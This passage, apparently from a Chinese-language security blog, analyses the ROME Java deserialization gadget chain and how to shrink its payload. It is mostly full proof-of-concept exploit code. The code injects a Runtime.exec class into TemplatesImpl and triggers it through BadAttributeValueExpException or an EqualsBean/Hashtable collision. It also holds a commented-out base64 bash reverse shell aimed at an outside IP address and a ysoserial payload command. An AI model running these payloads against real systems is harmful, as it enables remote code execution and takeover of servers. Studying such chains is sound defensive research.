            hashMap.put(objectBean, null);
            setFieldValue(objectBean, "_equalsBean", equalsBean);
            String s = serialize(hashMap);
            System.out.println("长度为：" + s.length());
            System.out.println(s);
            unserialize(s);
        }
    }
上图是使用了
  1. javassist动态生成class文件，而且`_name`仅为一个字符a, 删除了`_tfactory`属性值，写入空参构造恶意方法
  2. 使用asm技术，将动态生成的class文件的`LINENUMBER`指令给删掉
同样，也可以不调用Runtime类来命令执行，使用new ProcessBuilder(new
String[]{cmd}).start()更加能够缩短payload
那我们来看看不适用asm删除指令：
长度都已经大于2000了，所以说删除指令并不影响payload的执行且能达到命令执行的目的
##### 其他的链子
我们知道，在ysoserial项目中的ROME链，主要的触发点就是`ObjectBean`调用了`toString()`方法，进而进入了`TOStringBean`的`toString()`方法，最后执行了getOutputProperties()这个getter方法，其他的链子中同样可以找到调用了toString方法的类，而且还比这条链子更加短
###### BadAttributeValueExpException
在这个类中的`readObject`方法中
在这里我们读取`ObjectInputStream`中的信息
后面通过.get方法得到val的属性值
之后通过一系列判断，进入到了`valObj.toString()`方法中，而且这时候的valObj是ToStringBean类，成功触发了他的`toString()`方法，到达了命令执行的目的
POC:
    package ysoserial.vulndemo;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import com.sun.syndication.feed.impl.ToStringBean;
    import javassist.*;
    import javax.management.BadAttributeValueExpException;
    import javax.xml.transform.Templates;
    import java.io.*;
    import java.lang.reflect.Field;
    import java.util.Base64;
    public class Rome_shorter3 {
        public static byte[] getTemplatesImpl(String cmd) throws NotFoundException, CannotCompileException, IOException {
            ClassPool classPool = ClassPool.getDefault();
            CtClass ctClass = classPool.makeClass("Evil");
            CtClass superClass = classPool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
            ctClass.setSuperclass(superClass);
            CtConstructor constructor = CtNewConstructor.make("    public Evil(){\n" +
                "        try {\n" +
                "            Runtime.getRuntime().exec(\"" + cmd + "\");\n" +
                "        }catch (Exception ignored){}\n" +
                "    }", ctClass);
            ctClass.addConstructor(constructor);
            byte[] bytes = ctClass.toBytecode();
            ctClass.defrost();
            return bytes;
        }
        //设置属性值
        public static void setFieldValue(Object obj, String fieldName, Object value) throws NoSuchFieldException, IllegalAccessException {
            Field field = obj.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
            field.set(obj, value);
        }
        public static String serialize(Object obj) throws IOException {
            ByteArrayOutputStream barr = new ByteArrayOutputStream();
            ObjectOutputStream objOutput = new ObjectOutputStream(barr);
            objOutput.writeObject(obj);
            byte[] bytes = barr.toByteArray();
            objOutput.close();
            return Base64.getEncoder().encodeToString(bytes);
        }
        public static void unserialize(String code) throws IOException, ClassNotFoundException {
            byte[] decode = Base64.getDecoder().decode(code);
            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(decode);
            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
            objectInputStream.readObject();
        }
        public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
            TemplatesImpl templates = new TemplatesImpl();
            setFieldValue(templates, "_bytecodes", new byte[][]{getTemplatesImpl("calc")});
            setFieldValue(templates, "_name", "a");
            ToStringBean toStringBean = new ToStringBean(Templates.class, templates);
            //防止生成payload的时候触发漏洞
            BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(123);
            setFieldValue(badAttributeValueExpException, "val", toStringBean);
            String s = serialize(badAttributeValueExpException);
            System.out.println(s);
            System.out.println("长度为：" + s.length());
            unserialize(s);
        }
    }
调用链：
    BadAttributeValueExpException#readObject
        ToStringBean#toString
            TemplatesImpl#getOutputProperties
                .....
###### EqualsBean
在这个类中存在有触发满足条件的getter得方法：
**ToStringBean** :
**EqualsBean** :
两个长得确实像
那到底是不是可以利用呢？
在这个类的`equals`方法调用了`beanEquals`方法
我们也知道在CC7的时候使用了`equals`方法
在`Hashtable#readObject`中
跟进`Hashtable#reconstitutionPut`中
首先调用了key的hashcode方法，求他的hash值，之后在遍历，判断两个的hash值是否相等，如果相等之后才会触发到equals方法
我们就需要两个求hash相等的键：`yy / zZ`就是相等的
然后怎么调用equals方法呢？
我们来到他的`equals`方法中
如果这里的value为`EqualsBean`，而且这里的`e.getValue`是TemplateImpl对象这样就能够构造出利用链了
至于HashMap对象求hash值，hashMap 的hashCode
是遍历所有的元素，然后调用hashCode后相加，hashCode的值是key和value的hashCode异或
所以('yy',obj); 是等于put('zZ',obj)
则POC：
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import com.sun.syndication.feed.impl.EqualsBean;
    import javassist.*;
    import javax.xml.transform.Templates;
    import java.io.*;
    import java.lang.reflect.Field;
    import java.util.Base64;
    import java.util.HashMap;
    import java.util.Hashtable;
    public class RomeShorter{
        //缩短TemplatesImpl链
        public static byte[] getTemplatesImpl(String cmd) throws NotFoundException, CannotCompileException, IOException {
            ClassPool classPool = ClassPool.getDefault();
            CtClass ctClass = classPool.makeClass("Evil");
            CtClass superClass = classPool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
            ctClass.setSuperclass(superClass);
            CtConstructor constructor = CtNewConstructor.make("    public Evil(){\n" +
                "        try {\n" +
                "            Runtime.getRuntime().exec(\"" + cmd + "\");\n" +
                "        }catch (Exception ignored){}\n" +
                "    }", ctClass);
            ctClass.addConstructor(constructor);
            byte[] bytes = ctClass.toBytecode();
            ctClass.defrost();
            return bytes;
        }
        //设置属性值
        public static void setFieldValue(Object obj, String fieldName, Object value) throws NoSuchFieldException, IllegalAccessException {
            Field field = obj.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
            field.set(obj, value);
        }
        public static String serialize(Object obj) throws IOException {
            ByteArrayOutputStream barr = new ByteArrayOutputStream();
            ObjectOutputStream objOutput = new ObjectOutputStream(barr);
            objOutput.writeObject(obj);
            byte[] bytes = barr.toByteArray();
            objOutput.close();
            return Base64.getEncoder().encodeToString(bytes);
        }
        public static void unserialize(String code) throws IOException, ClassNotFoundException {
            byte[] decode = Base64.getDecoder().decode(code);
            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(decode);
            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
            objectInputStream.readObject();
        }
        public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
            TemplatesImpl templates = new TemplatesImpl();
            //setFieldValue(templates, "_bytecodes", new byte[][]{getTemplatesImpl("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuMjQuMjA3LjEyMS84MDAwIDA+JjE=}|{base64,-d}|{bash,-i}")});
            setFieldValue(templates, "_bytecodes", new byte[][]{getTemplatesImpl("calc")});
            setFieldValue(templates, "_name", "a");
            EqualsBean bean = new EqualsBean(String.class,"s");
            HashMap map1 = new HashMap();
            HashMap map2 = new HashMap();
            map1.put("yy",bean);
            map1.put("zZ",templates);
            map2.put("zZ",bean);
            map2.put("yy",templates);
            Hashtable table = new Hashtable();
            table.put(map1,"1");
            table.put(map2,"2");
            setFieldValue(bean,"_beanClass",Templates.class);
            setFieldValue(bean,"_obj",templates);
            String s = serialize(table);
            System.out.println(s);
            System.out.println(s.length());
            unserialize(s);
        }
    }
长度为1520
那如果我们使用ASM删除指令呢？
    //asm
        public static byte[] shorterTemplatesImpl(byte[] bytes) throws IOException {
            String path = System.getProperty("user.dir") + File.separator + "a.class"; //File.separator是分隔符
            try {
                Files.write(Paths.get(path), bytes);
            } catch (IOException e) {
                e.printStackTrace();
            }
            try {
                //asm删除LINENUMBER
                byte[] allBytes = Files.readAllBytes(Paths.get(path));
                ClassReader classReader = new ClassReader(allBytes);
                ClassWriter classWriter = new ClassWriter(ClassWriter.COMPUTE_FRAMES);
                int api = Opcodes.ASM9;
                ClassVisitor classVisitor = new Rome_shorter2.shortClassVisitor(api, classWriter);
                int parsingOptions = ClassReader.SKIP_DEBUG | ClassReader.SKIP_FRAMES;
                classReader.accept(classVisitor, parsingOptions);
                byte[] out = classWriter.toByteArray();
                Files.write(Paths.get(path), out);
            } catch (IOException e) {
                e.printStackTrace();
            }
            byte[] bytes1 = Files.readAllBytes(Paths.get("a.class"));
            //删除class文件
            Files.delete(Paths.get("a.class"));
            return bytes1;
        }
        //因为ClassVisitor是抽象类，需要继承
        public static class shortClassVisitor extends ClassVisitor{
            private final int api;
            public shortClassVisitor(int api, ClassVisitor classVisitor){
                super(api, classVisitor);
                this.api = api;
            }
        }
成功弹出了计算器，并且长度缩短为了1444
#### 生成POC
使用ysoserial工具生成POC
    java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ROME 'calc'|base64
#### 参考
[ROME反序列化分析 (c014.cn)](https://c014.cn/blog/java/ROME/ROME反序列化漏洞分析.html)
[Java 反序列化漏洞（五） - ROME/BeanShell/C3P0/Clojure/Click/Vaadin | 素十八
(su18.org)](https://su18.org/post/ysoserial-su18-5/#前置知识)
[终极Java反序列化Payload缩小技术 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/10824)